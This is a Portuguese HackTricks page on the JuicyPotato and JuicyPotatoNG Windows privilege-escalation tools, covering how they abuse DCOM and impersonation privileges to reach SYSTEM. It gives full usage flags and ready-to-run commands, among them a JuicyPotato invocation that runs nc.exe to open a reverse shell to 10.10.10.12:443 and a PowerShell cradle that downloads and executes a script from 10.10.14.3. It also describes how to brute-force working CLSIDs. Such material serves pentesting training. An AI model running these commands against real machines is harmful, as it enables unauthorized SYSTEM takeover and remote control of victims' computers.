# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato é legado. Geralmente funciona em versões do Windows até o Windows 10 1803 / Windows Server 2016. As alterações da Microsoft introduzidas a partir do Windows 10 1809 / Server 2019 quebraram a técnica original. Para essas versões e posteriores, considere alternativas modernas, como PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato e outras. Consulte a página abaixo para obter opções e instruções de uso atualizadas.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando dos privilégios dourados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Uma versão aprimorada do_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, com um pouco de suco, ou seja, **outra ferramenta de Local Privilege Escalation, de Windows Service Accounts para NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Você pode baixar o juicypotato em [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notas rápidas de compatibilidade

- Funciona de forma confiável até o Windows 10 1803 e o Windows Server 2016 quando o contexto atual possui SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.
- Quebrado pelo hardening da Microsoft no Windows 10 1809 / Windows Server 2019 e posteriores. Para essas versões, prefira as alternativas indicadas acima.

### Resumo <a href="#summary" id="summary"></a>

[**Do Readme do juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e suas [variantes](https://github.com/decoder-it/lonelypotato) utilizam a cadeia de privilege escalation baseada no serviço [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), com o listener MiTM em `127.0.0.1:6666`, quando você possui os privilégios `SeImpersonate` ou `SeAssignPrimaryToken`. Durante uma revisão de uma build do Windows, encontramos uma configuração na qual o `BITS` estava intencionalmente desabilitado e a porta `6666` estava ocupada.

Decidimos weaponize o [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Diga olá ao Juicy Potato**.

> Para a teoria, consulte [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e siga a cadeia de links e referências.<sup>[[4]](#references)</sup>

Descobrimos que, além do `BITS`, há vários servidores COM que podemos abusar. Eles precisam apenas de:

1. serem instanciáveis pelo usuário atual, normalmente um “service user” que possui privilégios de impersonation
2. implementarem a interface `IMarshal`
3. serem executados como um usuário elevado (SYSTEM, Administrator, …)

Após alguns testes, obtivemos e testamos uma lista extensa de [CLSID’s](http://ohpe.it/juicy-potato/CLSID/) [interessantes] em várias versões do Windows.

### Detalhes do Juicy <a href="#juicy-details" id="juicy-details"></a>

O JuicyPotato permite que você:<sup>[[1]](#references)</sup>

- **Target CLSID** _escolha qualquer CLSID que quiser._ [_Aqui_](http://ohpe.it/juicy-potato/CLSID/) _você encontra a lista organizada por OS._
- **COM Listening port** _defina a porta de escuta do COM de sua preferência (em vez da porta 6666 fixa e hardcoded pelo marshaling)_
- **COM Listening IP address** _faça o bind do servidor em qualquer IP_
- **Process creation mode** _dependendo dos privilégios do usuário impersonated, você pode escolher entre:_
- `CreateProcessWithToken` (precisa de `SeImpersonate`)
- `CreateProcessAsUser` (precisa de `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _execute um executável ou script se a exploração for bem-sucedida_
- **Process Argument** _personalize os argumentos do processo executado_
- **RPC Server address** _para uma abordagem stealthy, você pode se autenticar em um servidor RPC externo_
- **RPC Server port** _útil se você quiser se autenticar em um servidor externo e o firewall estiver bloqueando a porta `135`…_
- **TEST mode** _principalmente para fins de teste, ou seja, para testar CLSIDs. Ele cria o DCOM e exibe o usuário do token. Consulte_ [_aqui para testes_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerações finais <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Se o usuário tiver os privilégios `SeImpersonate` ou `SeAssignPrimaryToken`, então você é **SYSTEM**.

É praticamente impossível impedir o abuso de todos esses COM Servers. Você poderia considerar modificar as permissões desses objetos por meio do `DCOMCNFG`, mas boa sorte, pois isso será desafiador.

A solução real é proteger as contas e aplicações sensíveis executadas sob as contas `* SERVICE`. Interromper o `DCOM` certamente impediria esse exploit, mas poderia causar um impacto sério no sistema operacional subjacente.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG reintroduz uma elevação de privilégios local no estilo JuicyPotato no Windows moderno, combinando:<sup>[[2]](#references)</sup>
- Resolução DCOM OXID para um servidor RPC local em uma porta escolhida, evitando o listener antigo fixado em 127.0.0.1:6666.
- Um hook SSPI para capturar e personificar a autenticação SYSTEM de entrada sem exigir RpcImpersonateClient, o que também permite CreateProcessAsUser quando apenas SeAssignPrimaryTokenPrivilege está presente.
- Tricks para satisfazer as restrições de ativação do DCOM (por exemplo, o antigo requisito do grupo INTERACTIVE ao visar as classes PrintNotify / ActiveX Installer Service).

Observações importantes (comportamento em evolução entre diferentes builds):<sup>[[2]](#references)</sup>
- Setembro de 2022: A técnica inicial funcionava nos targets compatíveis com Windows 10/11 e Server usando o “INTERACTIVE trick”.
- Atualização dos autores em janeiro de 2023: A Microsoft bloqueou posteriormente o INTERACTIVE trick. Um CLSID diferente ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restaura a exploração, mas apenas no Windows 11 / Server 2022, de acordo com a publicação deles.

Uso básico (mais flags na ajuda):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Se você estiver visando Windows 10 1809 / Server 2019, onde o JuicyPotato clássico foi corrigido, prefira as alternativas vinculadas no topo (RoguePotato, PrintSpoofer, EfsPotato/GodPotato etc.). O NG pode ser situacional dependendo da build e do estado do serviço.

## Exemplos

Nota: Visite [esta página](https://ohpe.it/juicy-potato/CLSID/) para obter uma lista de CLSIDs para testar.

### Obter um reverse shell com nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Inicie um novo CMD (se você tiver acesso via RDP)

![Powershell rev - Inicie um novo CMD (se você tiver acesso via RDP): Inicie um novo CMD (se você tiver acesso via RDP)](<../../images/image (300).png>)

## Problemas com CLSID

Frequentemente, o CLSID padrão usado pelo JuicyPotato **não funciona** e o exploit falha. Normalmente, são necessárias várias tentativas para encontrar um **CLSID funcional**. Para obter uma lista de CLSIDs para testar em um sistema operacional específico, acesse esta página:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Verificando CLSIDs**

Primeiro, você precisará de alguns executáveis além do juicypotato.exe.

Baixe [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e carregue-o na sua sessão do PS. Depois, baixe e execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Esse script criará uma lista de possíveis CLSIDs para testar.

Em seguida, baixe [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(altere o caminho para a lista de CLSIDs e para o executável juicypotato) e execute-o. Ele começará a testar cada CLSID e, **quando o número da porta mudar, isso significará que o CLSID funcionou**.

**Verifique** os CLSIDs funcionais **usando o parâmetro -c**

## Referências

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Dando uma segunda chance ao JuicyPotato: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Página do projeto Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Escalação de privilégios de contas de serviço para SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

{{#include ../../banners/hacktricks-training.md}}
